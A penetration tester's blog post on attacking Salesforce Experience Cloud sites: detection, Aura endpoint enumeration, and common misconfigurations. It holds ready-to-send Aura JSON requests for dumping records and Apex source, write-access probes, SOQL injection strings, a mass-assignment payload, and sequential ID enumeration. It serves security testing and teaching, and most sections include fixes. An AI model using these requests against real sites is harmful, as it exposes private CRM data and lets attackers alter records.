+++
title = "Hacking Salesforce Experience Cloud: Enumeration and Common Misconfigurations"
date = "2026-05-14"
[ author ]
  name = "m1tz"
+++

This research began during the dedicated time my employer, [CODE WHITE](https://code-white.com), sets aside each year for independent security research. Over time, Experience Cloud repeatedly emerged as a recurring theme across client engagements, making it a natural candidate for a more structured deep dive. What started as a focused research initiative gradually extended into my free time, largely because the attack surface consistently proved to be both rich and unexpectedly interesting.

The last two posts on this blog went deep into SaaS misconfigurations, first Firebase, then Supabase. Both follow a familiar pattern: a developer-friendly backend, an auth model that is easy to misconfigure, and data that ends up more exposed than intended. Salesforce felt like the natural next step.

It dominates enterprise software in a way that Firebase and Supabase simply do not. Where those platforms power startups and side projects, Salesforce sits at the center of CRM, sales, support, and partner workflows for some of the largest companies in the world. And unlike a typical SaaS product where the vendor controls the deployment, Salesforce is a platform that customers configure themselves. That gap between the platform's capabilities and how customers actually use it is where the interesting security issues live.

Experience Cloud is the part of Salesforce that faces outward, customer portals, partner networks, self-service sites. Unauthenticated visitors, guest users, and community accounts all interact with Salesforce objects through it. Given the sheer number of deployments and the complexity of the permission model, misconfigurations are common and the impact can be significant.

---

## What is Experience Cloud

Experience Cloud (formerly Community Cloud) lets organizations build externally facing digital spaces on top of their Salesforce data. The key detail from a security perspective is that these sites expose Salesforce data and functionality to users outside the organization, including completely unauthenticated guests.

The page URI pattern is `/s/` and almost every action on the site routes through a single endpoint:

```
POST /s/sfsites/aura
```

This endpoint is the Aura framework's server-side action handler. It accepts JSON payloads describing what controller method to call and with what parameters. Everything from loading a record to running a custom Apex function flows through here.

Detection does not require probing the Aura endpoint directly. A passive GET-based check on the landing page is enough, Salesforce instances embed recognizable markers in their page source:

```yaml
id: salesforce-detect
info:
  name: Detect Salesforce instance
  author: m1tz
  severity: info
  tags: detect
http:
  - method: GET
    path:
      - "{{BaseURL}}"
    matchers-condition: and
    host-redirects: true
    matchers:
      - type: word
        part: body
        condition: or
        words:
          - ',"@salesforce",'
          - ',"markup://salesforce'
          - ',"markup://force'
          - ',"com.salesforce'
      - type: status
        status:
          - 200
```

Google dorks like `inurl:/s/article` or `inurl:/s/login` surface public instances quickly. Note that communities may also use a custom `$Site.Prefix` value, `/partners`, `/support`, `/business`, which prefixes all routes including the Aura endpoint itself. If the standard paths do not respond, try variations based on the site's purpose.

---

## Architecture in Brief

Before going into exploitation, it helps to understand the moving parts.

**Aura** is the older UI framework. Components communicate with backend Apex code via action descriptors. A typical request:

```json
{
  "actions": [{
    "id": "1;a",
    "descriptor": "apex://MyController/ACTION$myMethod",
    "callingDescriptor": "UNKNOWN",
    "params": { "recordId": "001gK00000NcgDtQAJ" }
  }]
}
```

The `id` field is arbitrary, the browser uses it to match responses to requests, but the server ignores its value. The `callingDescriptor` is similarly ignored in practice, `"UNKNOWN"` works universally.

The `aura.token` POST parameter signals authentication state. A value of `undefined` means you are acting as the guest user. A JWT token means you hold an authenticated community session. This is a quick way to confirm which privilege level any given request runs under without inspecting cookies.

**LWC (Lightning Web Components)** is the modern replacement and behaves quite differently from Aura. Rather than shipping component logic as individual JS files served from `/components/c/`, LWC bundles everything together at build time. The bundles are served under paths like:

```
/s/modules/c/<componentName>.js        ← org custom components
/s/modules/lwc/<componentName>.js      ← base LWC framework files
/s/modules/lightning/<componentName>.js ← Salesforce standard components
```

Because LWC compiles and bundles at deploy time, you will often see multiple components' logic merged into a single file under `/s/sfsites/l/<encodedJson>/`. This means you cannot always request individual component files by name the way you can with Aura, instead, watch the network traffic on page load and inspect the bundle responses directly. The encoded JSON in the path is a context descriptor that identifies the app version and loaded components, decoding it reveals which namespaces and bundles are in play for that page.

**LWR (Lightning Web Runtime)** is the modern hosting layer beneath LWC-based Experience Cloud sites and behaves differently from Aura in ways that directly affect enumeration. Rather than routing through the `/s/sfsites/aura` action queue, LWR uses a REST-style endpoint at `/webruntime/api/`, Apex calls go to `GET /webruntime/api/apex/execute` with query parameters instead of a POST JSON envelope. Apex controllers are precompiled at deploy time and referenced by internal `@udd/<ClassId>` identifiers rather than human-readable class names. The mapping from class name to internal ID is embedded in the page JS bundles, meaning you must extract it from the JS before you can invoke any controller. You cannot simply call `apex://MyController/ACTION$myMethod` as you would against Aura, the `@udd/` identifier is a prerequisite.

**Apex** is Salesforce's proprietary backend language, Java-like, running in either system context (full access, ignores sharing rules) or user context depending on the developer's choice. Methods decorated with `@AuraEnabled` are remotely callable. The critical insight: Apex runs in **system context by default**, meaning it bypasses sharing rules unless the developer explicitly opts into `with sharing`.

**SOQL** is Salesforce's query language. It is read-only and sandboxed, no stacked queries, no `UNION`, no arbitrary cross-object joins. More on this in the injection section below.

The data model layers access control across three tiers: Object Level Security (OLS/CRUD), Field Level Security (FLS), and Record Level Security (RLS/sharing rules). Custom objects are frequently misconfigured at all three.

---

## Impact

Before diving into techniques, it is worth being explicit about what is actually at stake. The attack surface on a Salesforce Experience Cloud site might look narrow, it is read-only queries, no shell access, no `UNION`-based exfil. But the data sitting behind these endpoints is business-critical by nature: CRM records, support cases, contracts, partner information, employee data.

Impact broadly falls into two categories:

**Data exposure.** The most common outcome. A guest user or low-privilege community account reads records they should not, contacts, cases, email threads, files, custom objects holding internal business data. SOQL injection, broken object permissions, and sequential ID enumeration are the primary paths here. Because Salesforce IDs are predictable and sequential, a single readable object with no RLS enforcement is often enough to enumerate the entire record set.

**Business logic abuse.** Less obvious but sometimes more impactful. Writable objects or exposed Apex methods can be used to manipulate platform state: updating record fields to change workflow outcomes, deactivating users, altering ownership of records, or triggering automation that was only meant to fire under controlled conditions. A controller that updates a `User` record without proper FLS checks, for example, could allow a community user to deactivate accounts or modify profile assignments. These issues are harder to find by brute-force but often have outsized impact when they do exist.

**Self-registration as a risk multiplier.** It is worth calling this out separately. On a site with no self-registration, an attacker is limited to what a guest account can reach, usually a constrained set of objects and actions. The moment self-registration is available, the entire authenticated attack surface opens up. Community user sessions typically have much broader object access than guest sessions, and custom controllers often make assumptions about who is calling them (a real customer, a known partner) that break down when anyone can sign up. Every misconfiguration that was merely annoying as a guest becomes genuinely exploitable once you hold a valid session. This single configuration decision dramatically increases the likelihood of a meaningful finding.

---

## Reconnaissance

### Bootstrap and App.js

The most useful starting points are the JavaScript files loaded during site initialization.

`bootstrap.js` is fetched at a path like:

```
https://my.site.com/s/sfsites/l/<encodedJson>/bootstrap.js
```

It contains the full route map for the site. Each route entry reveals page types, whether the page is public, and sometimes the backing Salesforce object via `entity_name`. Routes not linked anywhere in the navigation are still present here:

```json
"/createrecord/:actionApiName": {
  "dev_name": "Create_Record",
  "is_public": "true",
  "entity_name": "Account",
  "page_type_info": "..."
}
```

The `event` field in route entries often leaks the key prefix for custom objects, `"event": "relatedlist-a0q"` tells you the prefix is `a0q`, which you can use to generate valid record IDs for enumeration.

`app.js` is a map of every component and server action descriptor the client knows about. Look for:

- `apex://` prefixes, custom Apex controller actions
- `compound://c.<ComponentName>` or `markup://c:<ComponentName>`, custom frontend components
- The `pa` array in each action definition, parameter names and types

An example from a real component definition:

```json
{
  "descriptor": "compound://c.HelpCenterBrandDetails",
  "ac": [{
    "n": "getDependentMap",
    "descriptor": "apex://HelpCenterCommunityController/ACTION$getDependentMap",
    "at": "SERVER",
    "rt": "apex://Map<String,List<String>>",
    "pa": [
      { "name": "objDetail", "type": "apex://SObject" },
      { "name": "contrfieldApiName", "type": "apex://String" },
      { "name": "depfieldApiName", "type": "apex://String" }
    ]
  }]
}
```

For Aura components, the JavaScript source is usually accessible directly by name:

```
https://my.site.com/components/c/HelpCenterBrandDetails.js
```

For LWC, you will not find individual files this way, look at the bundle responses loaded during page initialization instead.

### Object and Site Enumeration via getConfigData

A call to `getConfigData` is one of the most information-dense requests you can make. It returns all Salesforce objects the site knows about, their three-character key prefixes, and a range of site configuration details including enabled features:

```json
{
  "actions": [{
    "id": "123;a",
    "descriptor": "serviceComponent://ui.force.components.controllers.hostConfig.HostConfigController/ACTION$getConfigData",
    "callingDescriptor": "UNKNOWN",
    "params": {}
  }]
}
```

The response contains `apiNamesToKeyPrefixes`, a full map of every object API name to its ID prefix. Custom objects end in `__c`. Relationship traversals end in `__r`.

Beyond object names, the same response exposes site-level feature flags. Pay attention to fields like:

```json
"ApexRestServices": true,
"ViewAllCustomSettings": true,
"ContentWorkspaces": true
```

`ApexRestServices: true` means custom REST endpoints are likely reachable. `ViewAllCustomSettings: true` is particularly interesting, it grants read access to custom settings via the API, which sometimes contains credentials or internal configuration values.

Interesting objects to target regardless of what `getConfigData` returns: `User`, `Contact`, `Account`, `Lead`, `Case`, `ContentDocument`, `ContentVersion`, `ContentDocumentLink`, `EmailMessage`, `Attachment`, `ApexClass`, and any custom `__c` object the response reveals.

### Inspecting Component Definitions via /auraCmpDef

Once you have a component descriptor from `app.js` or traffic inspection, you can query its full definition directly, including all action names, parameter names, types, and return types, without having to grep through large JS bundles.

The endpoint takes a few values from any intercepted Aura request. Pull `aura.app` and the `_au` value from the `aura.context` POST parameter (or search the response for `Application@markup://`):

```
/s/auraCmpDef?aura.app=markup://siteforce:communityApp&_au=<AU_VALUE>&_ff=DESKTOP&_l=true&_cssvar=false&_c=false&_l10n=en_US&_style=-1450740311&_density=VIEW_ONE&_def=markup://c:MyComponent
```

The response is a structured JSON definition of the component, cleaner than hunting through `app.js` and gives you every callable action in one request. This is the fastest way to get a complete method inventory for a specific custom controller once you know its name.

### Record Retrieval

With an object name and record ID, records can be pulled directly:

```json
{
  "actions": [{
    "id": "123;a",
    "descriptor": "serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems",
    "callingDescriptor": "UNKNOWN",
    "params": {
      "entityNameOrId": "Contact",
      "layoutType": "FULL",
      "pageSize": 100,
      "currentPage": 0,
      "useTimeout": false,
      "getCount": false,
      "enableRowActions": false
    }
  }]
}
```

Responses under roughly 12,000 bytes typically mean either no access or only your own record is returned. Larger responses indicate data exposure worth investigating.

### Salesforce ID Structure and Sequential Enumeration

Salesforce IDs are 18 characters. The structure is:

```
001Do000002LlTAIA0
│││││ ││││││││││ │└─ checksum (case-safe)
│││││ │└──────┘ └── unique identifier (sequential)
│└─┘└─ reserved
└── object type prefix (first 3 chars)
```

The third group of five characters is **sequential**. Given one valid record ID, you can increment or decrement it to generate adjacent IDs for the same object type. IDs are not a security boundary, they are an enumeration surface.

A known prefix from `getConfigData` or `bootstrap.js` combined with one valid record ID is enough to walk the entire record set if the object has no RLS enforcement. The [salesforce-id-generator](https://github.com/hypn/misc-scripts/blob/master/salesforce-id-generator.py) script automates this: feed it a valid ID and a count, and it outputs a list ready for Burp Intruder or ffuf.

```bash
# Generate 20 sequential IDs from a known starting point
python3 salesforce-id-generator.py 006Do0000028TPmIAM 20
```

This matters most when you find an object that is readable but not properly limited by RLS, the common case with custom objects where developers grant Read access without configuring sharing rules.

---

## Misconfigurations

### Self-Registration Enabled

When *Allow customers and partners to self-register* is turned on, anyone can create an account. As covered in the impact section, this is not just one misconfiguration, it is a multiplier for every other issue on the site.

The registration page lives at `/s/login/SelfRegister`. The Aura call behind it:

```json
{
  "actions": [{
    "id": "168;a",
    "descriptor": "apex://applauncher.SelfRegisterController/ACTION$selfRegister",
    "callingDescriptor": "markup://salesforceIdentity:selfRegister2",
    "params": {
      "firstname": "joe", "lastname": "kelly",
      "email": "joe@example.com",
      "password": "", "confirmPassword": "",
      "regConfirmUrl": "./CheckPasswordResetEmail",
      "extraFields": "[]", "startUrl": "/s/",
      "includePassword": false
    }
  }]
}
```

If the *Headless Registration API* is also enabled:

```http
POST /services/auth/headless/init/registration HTTP/2
Host: target.com
Content-Type: application/json
{
  "userdata": {
    "firstName": "Joe", "lastName": "Kelly",
    "email": "joe@example.com", "username": "joe_kb"
  },
  "password": "Test11!elf",
  "verificationmethod": "email"
}
```

### Guest User Permissions

The guest user is a **single shared account** for all unauthenticated visitors. Any permission granted to it applies to everyone simultaneously. Common issues:

- *Let guest users see other members of this site*, leaks user data to anyone
- *Access Activities*, exposes activity records
- Overly broad object permissions on default and custom objects
- *View All Lookup Record Names*, allows using search to traverse record names across the org

Guest record ownership is particularly subtle: if a guest user can create records, all guests share ownership of those records, meaning any anonymous visitor can read data submitted by another anonymous visitor.

### Insecure Apex Sharing Mode

Apex classes can be written with `with sharing` (respects sharing rules), `without sharing` (ignores them), or `inherited sharing`. The problem arises when `without sharing` is used in a class reachable from an unauthenticated context, which effectively bypasses the entire RLS model for that controller.

```java
// Ignores all sharing rules, any caller sees all records
public without sharing class MyDataController {
    @AuraEnabled
    public static List<Contact> getContacts(String search) {
        return Database.query(
            'SELECT Id, Name, Email FROM Contact WHERE Name LIKE \'%' + search + '%\''
        );
    }
}
```

The above is also a SOQL injection example.

### Apex Source Code Retrieval

If a community user, or a guest, has read access to the `ApexClass` standard object, the full source code of custom controllers is directly retrievable through the standard `getItems` call. The `Body` field contains the raw Apex source.

```json
{
  "actions": [{
    "id": "123;a",
    "descriptor": "serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems",
    "callingDescriptor": "UNKNOWN",
    "params": {
      "entityNameOrId": "ApexClass",
      "layoutType": "FULL",
      "pageSize": 100,
      "currentPage": 0,
      "useTimeout": false,
      "getCount": false,
      "enableRowActions": false
    }
  }]
}
```

When this works, it turns black-box testing into white-box instantly. The source reveals `without sharing` declarations, dynamic SOQL strings, parameter handling, and any hardcoded values. In practice, `ApexClass` read access should return nothing for a guest or community user, if it returns source code, that is a critical finding in itself before you even read the code.

### SOQL Injection and When It Actually Matters

SOQL is read-only. No `INSERT`, `UPDATE`, `DELETE`. No `UNION`. No stacked queries. This limits what injection can achieve compared to SQL, you cannot write data and you cannot pivot to arbitrary unrelated tables.

What injection *can* do depends on two things: the sharing mode of the controller and the structure of the injection point.

A concrete example of why sharing mode matters: `ContentDocument` is one of the more impactful objects to reach via injection, because it holds attached files. If a controller runs `without sharing` and accepts user input in a `WHERE` clause, injecting out of the intended filter and into a `ContentDocument` query can expose files that should be invisible to the caller. The fields of interest are `Id`, `Title`, `LatestPublishedVersionId`, and `FileExtension`, enough to identify files and construct direct download URLs via the shepherd paths. Once you have a `ContentVersionId` (`068` prefix), the download path `/sfc/servlet.shepherd/version/download/<id>` often succeeds even when the underlying API call would otherwise be blocked by object permissions.

**WHERE injection**, the most common case, breaks out of the intended filter to return records outside the caller's scope:

```
# Input
test%') OR (Name LIKE '
# Vulnerable query becomes
SELECT Id FROM Contact WHERE (IsDeleted = false AND Name LIKE '%test%') OR (Name LIKE '%')
```

Confirm injection by sending a single quote `'`. A `System.QueryException: unexpected token: '''` in the response confirms it.

**SELECT/field injection** is less discussed but equally impactful when a REST endpoint or custom API passes a user-controlled `fields` parameter into the `SELECT` clause. SOQL allows relationship traversal directly in the field list, up to five levels of parent via the `__r` suffix, and nested child queries in the `SELECT`. An attacker can add fields like `CreatedBy.Email` or `Account.CreatedBy.Name` to pull internal employee data from a query that was only meant to return customer-facing fields:

```
# Original API call
https://api.company.com/Contact?fields=FirstName,LastName,Email
# Attacker adds relationship traversal
?fields=FirstName,LastName,Email,CreatedBy.Name,CreatedBy.Email,Account.CreatedBy.Email
```

The resulting SOQL pulls internal user PII that was never intended to be exposed.

**Blind injection** applies when output is fixed, the controller always returns the same object type and you cannot see injected data directly. In this case, boolean-based inference works by manipulating the `WHERE` clause to add conditions that filter based on data you want to extract, then observing whether any records are returned:

```
# Is there a Contact whose owner's email starts with 'a'?
deleted=false AND CreatedBy.Email LIKE 'a%'
```

Zero results means no, one or more means yes. Loop over characters to extract the value.

The practical question before investing time: does the controller run `without sharing`? If yes, injection has real impact regardless of object RLS. If the controller runs `with sharing`, injection may confirm the vulnerability exists without yielding anything beyond what the user could already see.

**Fix**, use bind variables in all cases:

```java
String safeName = '%' + userInput + '%';
List<Contact> results = [SELECT Id FROM Contact WHERE Name LIKE :safeName];
```

Anything using `Database.query()` with string concatenation is a candidate for injection.

### Permissive Object Permissions

Custom objects are worth testing systematically, developers often leave them in inconsistent CRUD states. Test both create and update access for every object of interest.

**Create probe**, no record ID needed, works generically:

```json
{
  "actions": [{
    "id": "123;a",
    "descriptor": "aura://RecordUiController/ACTION$createRecord",
    "callingDescriptor": "UNKNOWN",
    "params": {
      "recordInput": {
        "allowSaveOnDuplicate": false,
        "apiName": "SomeCustomObject__c",
        "fields": {}
      }
    }
  }]
}
```

- `REQUIRED_FIELD_MISSING` → object is **writable**
- `CANNOT_INSERT_UPDATE_ACTIVATE_ENTITY` → object is not writable

**Update probe**, requires a known record ID, but confirms whether existing records can be modified:

```json
{
  "actions": [{
    "id": "764;a",
    "descriptor": "aura://RecordUiController/ACTION$updateRecord",
    "callingDescriptor": "UNKNOWN",
    "params": {
      "recordId": "<recordId>",
      "recordInput": {
        "allowSaveOnDuplicate": false,
        "fields": {}
      }
    }
  }]
}
```

- Response includes record data and `CreatedBy` → update **succeeded**
- `REQUIRED_FIELD_MISSING` → update **permitted** but requires field values to complete
- `CANNOT_INSERT_UPDATE_ACTIVATE_ENTITY` → update not permitted

Write access on objects like `User` or `Case` is worth treating as high severity, modifying these records can have direct business logic consequences beyond simple data exposure.

### Mass Assignment via Custom Controllers

Custom Apex controllers that pass request fields directly to `Database.insert()` or `Database.update()` without an explicit allowlist are vulnerable to mass assignment. An attacker can supply additional fields, `OwnerId`, `IsCustomerPortal`, role or profile assignments, that the controller never intended to accept. This is the Salesforce equivalent of the classic mass assignment vulnerability:

```json
{
  "Name": "Legitimate Account",
  "OwnerId": "005xx0000012345AAA",
  "IsCustomerPortal": true,
  "BillingCity": "New York"
}
```

If the controller passes the entire request body to a DML operation, all of these fields get written. The fix is an explicit field allowlist in the controller before any DML call.

### REST API Access

If `ApexRestServices` is set to `true` in the `getConfigData` response, custom REST endpoints may be accessible at `/services/apexrest/<endpoint>`. Any Apex class decorated with `@RestResource` and `global` scope becomes reachable here, often with weaker access controls than the Aura layer because they were designed for integration, not public-facing sites.

---

## Files and Attachments

Files flow through three objects: `ContentDocument` (the file), `ContentVersion` (a specific version), and `Document`. Download URLs follow predictable patterns:

```textplain
# ContentDocument (prefix 069)
/sfc/servlet.shepherd/document/download/069xxxx
# Via community path
/sfsites/c/sfc/servlet.shepherd/document/download/069xxxx
# ContentVersion (prefix 068)
/sfc/servlet.shepherd/version/download/068xxxx
# Document (prefix 015)
/servlet/servlet.FileDownload?file=015xxxx
```

If record IDs for `ContentDocument` or `ContentVersion` objects can be retrieved through a SOQL injection or permissive object access, direct file download often works even when the underlying API call would otherwise be blocked.

---

## Third-Party Packages

AppExchange packages install as first-class components. Managed packages ship compiled, so Apex source is not readable, but component structure and action descriptors remain visible.

Watch traffic for calls to `/l/` with encoded JSON. These responses define all components loaded for the current page, including third-party ones. Decode the JSON and look for non-standard namespaces:

```json
{
  "descriptor": "compound://my_app.Component",
  "ac": [{
    "n": "doAction",
    "descriptor": "apex://my_app.ComponentController/ACTION$doAction",
    "at": "SERVER",
    "rt": "apex://String",
    "pa": []
  }]
}
```

`my_app` here is not a Salesforce standard namespace. Cross-reference against AppExchange, if the package is open source (many are at `github.com/SalesforceLabs`), read the source directly to understand access control logic before probing.

Standard namespaces to filter out: `lightning`, `ui`, `force`, `siteforce`, `aura`. Anything else is custom code or a third-party package.

---

## Workflow

A typical assessment follows this path:

1. Detect the instance with the nuclei template, account for custom site prefixes (`/partners/`, `/support/`, etc.)
2. Call `getConfigData` to get the full object list, key prefixes, and enabled features
3. Pull `bootstrap.js` to map routes, page visibility, and unreferenced pages, note custom object prefixes in `event` fields
4. Pull `app.js` and inspect `/l/` bundle responses to enumerate all controller actions and parameter signatures
5. For Aura custom controllers, fetch source at `/components/c/<name>.js`, use `/auraCmpDef` for a clean per-component method inventory, for LWC, inspect bundle traffic directly
6. Test read access with `getItems` for every interesting object, include `ApexClass` to attempt source retrieval
7. Use sequential ID enumeration on any readable object that returns records, to probe for missing RLS
8. Test write access with `createRecord` and `updateRecord` for every interesting object
9. Attempt SOQL injection in any controller that accepts free-text input, cover both WHERE and SELECT injection, prioritize `without sharing` classes
10. Check REST endpoints if `ApexRestServices` is enabled, probe for SELECT field injection on any that accept field lists
11. Register an account if self-registration is available and repeat from step 2 with an authenticated session

Tools that automate parts of this: [auraditor](https://github.com/irsdl/auraditor), [aura-dump](https://github.com/prjblk/aura-dump), [salesforce-id-generator](https://github.com/hypn/misc-scripts/blob/master/salesforce-id-generator.py).

---

## Closing Thoughts

Experience Cloud makes Salesforce data externally accessible by design. The platform's complexity, Aura, LWC, Apex, SOQL, OLS, FLS, RLS, means there are many places where the security model can break down. Unlike a typical web application where access control lives in one place, Salesforce requires developers to correctly layer permissions at the object level, the field level, the record level, and in the Apex sharing model simultaneously. Miss any one of them and data meant to be private becomes accessible through the Aura endpoint.

The attack surface on any given site may look limited at first glance. But predictable and sequential record IDs, a shared guest account model, readable Apex source, and opt-in sharing enforcement means small misconfigurations have outsized reach. And the moment self-registration enters the picture, that surface expands significantly. The strongest signal that an org is worth looking at closely is not any single finding, it is an open registration form.

---

## References

- https://www.enumerated.ie/index/salesforce
- https://www.enumerated.ie/index/salesforce-lightning-tinting-the-windows
- https://mastersplinter.work/research/salesforce-sqli/
- https://projectblack.io/blog/salesforce-penetration-testing-fundamentals/
- https://blog.hypn.za.net/2022/11/12/Hacking-Salesforce-backed-WebApps/
- https://infosecwriteups.com/in-simple-words-pen-testing-salesforce-saas-application-part-1-the-essentials-ffae632a00e5
- https://infosecwriteups.com/in-simple-words-pen-testing-salesforce-saas-application-part-2-fuzz-exploit-eefae11ba5ae
- https://www.varonis.com/blog/abusing-salesforce-communities
- https://0xbro.red/writeups/web-hacking/salesforce-hacking/
- https://developer.salesforce.com/docs/atlas.en-us.object_reference.meta/object_reference/sforce_api_objects_list.htm